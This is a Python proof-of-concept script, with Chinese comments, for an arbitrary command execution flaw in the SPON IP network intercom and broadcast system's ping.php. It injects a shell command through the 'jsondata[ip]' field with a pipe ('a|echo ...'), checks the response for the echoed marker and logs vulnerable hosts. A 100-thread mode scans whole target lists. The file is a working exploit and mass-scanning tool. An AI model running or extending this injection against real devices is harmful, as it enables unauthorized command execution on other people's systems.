# 世邦通信 SPON IP网络对讲广播系统 ping.php 任意命令执行漏洞
#导包
import argparse,sys,requests,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()   #解除警告
def banner():
    banner = ''' 
███████╗██╗  ██╗██╗   ██╗██╗   ██╗
██╔════╝██║ ██╔╝╚██╗ ██╔╝██║   ██║
███████╗█████╔╝  ╚████╔╝ ██║   ██║
╚════██║██╔═██╗   ╚██╔╝  ██║   ██║
███████║██║  ██╗   ██║   ╚██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ 
'''
    print(banner)
def poc(target):
    url = target+"/php/ping.php"
    headers={
            "User-Agent":"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10",
            "Content-Length":"69",
            "Content-Type":"application/x-www-form-urlencoded",
            "Accept-Encoding":"gzip, deflate, br",
            "Connection":"close",
            }
    data = "jsondata[ip]=a|echo c4ca4238a0b923820dcc509a6f75849b&jsondata[type]=1"
    try:
        res = requests.get(url,headers=headers,verify=False,data=data,timeout=5)
        if res.status_code==200 and "c4ca4238a0b923820dcc509a6f75849b" in res.text:
            print(f"[+] {target} 存在漏洞")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] {target} 无")
    except:
        print(f"[*] {target} server error")
def main():
    banner()
    #处理命令行参数
    parser = argparse.ArgumentParser(description='')
    #添加两个参数
    parser.add_argument('-u','--url',dest='url',type=str,help='urllink')
    parser.add_argument('-f','--file',dest='file',type=str,help='filename.txt(Absolute Path)')
    #调用
    args = parser.parse_args()
    # 处理命令行参数了
    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
    # 反之开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
if __name__ == '__main__':   #主函数入口
    main()     #入口  main()